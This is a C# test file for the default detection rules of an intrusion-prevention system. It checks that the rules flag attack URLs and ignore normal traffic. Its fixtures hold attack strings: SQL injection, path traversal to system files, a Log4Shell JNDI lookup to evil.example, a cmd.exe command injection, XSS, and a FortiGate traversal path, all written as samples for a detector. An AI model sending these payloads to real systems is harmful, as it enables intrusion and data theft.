using CRSP.IPS.Application.Abstracoes;
using CRSP.IPS.Application.Modelos;
using CRSP.IPS.Application.Motor;
using CRSP.IPS.Domain.Enums;
using CRSP.IPS.Domain.ObjetosValor;
using CRSP.IPS.Infrastructure.Persistencia;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;

namespace CRSP.IPS.Tests.Integracao;

public class CatalogoRegrasTestes
{
    private static readonly DateTime Agora = new(2026, 9, 23, 12, 0, 0, DateTimeKind.Utc);

    /// <summary>URLs legitimas de sistemas ASP.NET tipicos: nenhuma regra de padrao de URL pode casar com elas.</summary>
    public static TheoryData<string> UrlsLegitimas => new()
    {
        "/Apps/Pedidos/Grid.aspx?id=10&status=aberto",
        "/Conta/Entrar?ReturnUrl=%2FBloqueios",
        "/api/v2/ordens-servico?pagina=2&ordem=data",
        "/ApiV2/Anexos/download?arquivo=relatorio-setembro.pdf",
        "/css/site.css",
        "/js/select2.min.js",
        "/Admin/Relatorios/Exportar.ashx?formato=xlsx",
        "/webhub/eventos?filtro=union+station",
        "/Manager/Usuarios.aspx",
        "/api/v2/profissionais?nome=Oliveira&cidade=Sao+Paulo"
    };

    public static TheoryData<string, string> Ataques => new()
    {
        { "Scanner de PHP/JSP", "/index.php?s=/Index/think" },
        { "Scanner de PHP/JSP", "/admin/login.jsp" },
        { "Injeção SQL na URL", "/Apps/Pedidos/Grid.aspx?id=1+UNION+ALL+SELECT+null,null--" },
        { "Injeção SQL na URL", "/produtos?id=1%27%20or%201=1--" },
        { "Injeção SQL na URL", "/busca?q=1;WAITFOR%20DELAY%20'0:0:5'" },
        { "Path traversal", "/download?arquivo=..%2f..%2fwindows%2fwin.ini" },
        { "Path traversal", "/static/../../etc/passwd" },
        { "Execução remota / Log4Shell", "/?x=${jndi:ldap://evil.example/a}" },
        { "Execução remota / Log4Shell", "/cgi?cmd=cmd.exe+/c+whoami" },
        { "XSS na URL", "/busca?q=%3Cscript%3Ealert(1)%3C/script%3E" },
        { "Arquivos sensíveis e backups", "/web.config" },
        { "Arquivos sensíveis e backups", "/appsettings.Production.json" },
        { "Arquivos sensíveis e backups", "/backup.zip" },
        { "Painéis e serviços de terceiros", "/manager/html" },
        { "Painéis e serviços de terceiros", "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" },
        { "Varredura de Exchange/OWA", "/autodiscover/autodiscover.json?@evil.com/owa/" }
    };

    [Fact]
    public void Catalogo_TemNomesUnicosERegrasValidas()
    {
        var regras = CatalogoRegrasPadrao.Listar(Agora).ToList();

        Assert.Equal(16, regras.Count);
        Assert.Equal(regras.Count, regras.Select(r => r.Regra.Nome).Distinct(StringComparer.OrdinalIgnoreCase).Count());
        Assert.All(regras, r => Assert.InRange(r.Versao, 1, CatalogoRegrasPadrao.VersaoAtual));
    }

    [Theory]
    [MemberData(nameof(Ataques))]
    public void RegraDetectaAtaque(string nomeRegra, string url)
    {
        var regra = CatalogoRegrasPadrao.Listar(Agora).Single(r => r.Regra.Nome == nomeRegra).Regra;

        Assert.True(new AvaliadorRegras().Corresponde(regra, Evento(url)), $"{nomeRegra} deveria detectar {url}");
    }

    [Theory]
    [MemberData(nameof(UrlsLegitimas))]
    public void NenhumaRegraDeUrlCasaComTrafegoLegitimo(string url)
    {
        var avaliador = new AvaliadorRegras();
        var casaram = CatalogoRegrasPadrao.Listar(Agora)
            .Select(r => r.Regra)
            .Where(r => r.Criterio == TipoCriterio.PadraoUrl && avaliador.Corresponde(r, Evento(url)))
            .Select(r => r.Nome)
            .ToList();

        Assert.True(casaram.Count == 0, $"{url} casou com: {string.Join(", ", casaram)}");
    }

    [Fact]
    public async Task BancoExistente_RecebeSomenteRegrasNovasENaoRecriaExcluidas()
    {
        await using var ambiente = await AmbienteTeste.CriarAsync();
        var nomesVersao2 = CatalogoRegrasPadrao.Listar(Agora).Where(r => r.Versao == 2).Select(r => r.Regra.Nome).ToList();

        // Simula um banco instalado antes da versao 2, em que o administrador excluiu uma regra da versao 1.
        await ambiente.ExecutarAsync(async p =>
        {
            var contexto = p.GetRequiredService<ContextoIps>();
            await contexto.Database.ExecuteSqlRawAsync("UPDATE Configuracao SET VersaoRegrasPadrao = 1");
            await contexto.Regras.Where(r => nomesVersao2.Contains(r.Nome) || r.Nome == "Excesso de 401/403").ExecuteDeleteAsync();
        });

        await ambiente.ExecutarAsync(p => InicializadorBanco.InicializarAsync(p));
        await ambiente.ExecutarAsync(p => InicializadorBanco.InicializarAsync(p));

        var nomes = await ambiente.ExecutarAsync(async p => (await p.GetRequiredService<IRepositorioRegras>().ListarAsync()).Select(r => r.Nome).ToList());
        Assert.All(nomesVersao2, nome => Assert.Single(nomes, nome));
        Assert.DoesNotContain("Excesso de 401/403", nomes);
        Assert.Equal(15, nomes.Count);
    }

    private static EventoDetectado Evento(string url) =>
        new(EnderecoIp.Converter("203.0.113.7"), TipoFonte.LogIis, Agora, "GET", url, 404);
}
